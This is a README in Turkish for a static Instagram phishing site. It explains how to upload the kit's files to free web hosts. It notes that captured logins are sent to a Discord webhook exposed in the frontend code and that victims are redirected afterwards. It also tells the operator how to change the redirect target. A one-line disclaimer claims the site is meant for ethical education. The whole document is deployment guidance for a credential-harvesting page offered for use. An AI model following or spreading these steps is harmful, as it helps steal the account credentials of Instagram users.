# Instagram Phishing Site - Statik Versiyon

Bu klasör, Instagram phishing sitesinin **statik versiyonunu** içerir. Bu versiyonu basit bir şekilde herhangi bir web hosting hizmetine (InfinityFree, GitHub Pages, vb.) yükleyerek çalıştırabilirsiniz.

## Kurulum Adımları

1. Bu klasördeki tüm dosyaları hosting servisinizin ana dizinine yükleyin:
   - `index.html`
   - `assets/` klasörü (tümü)
   - `images/` klasörü (tümü)

2. Yükleme işlemi tamamlandıktan sonra, site çalışmaya hazırdır.

## Önemli Notlar

- **CORS Sorunları**: Discord API'sine doğrudan istekler yaparken tarayıcınız CORS hataları verebilir.
- **Webhook URL'i**: Discord webhook URL'i frontend kodunda açıkça görünür durumdadır.
- **Yönlendirme URL'i**: Giriş yapıldıktan sonra kullanıcılar varsayılan olarak `example.com` adresine yönlendirilir. Bu URL'i değiştirmek isterseniz, `assets/index-*.js` dosyasını düzenleyebilirsiniz.

## Güvenlik Uyarısı

Bu site sadece etik eğitim amaçlı kullanılmalıdır. İzinsiz kullanım yasalara aykırı olabilir.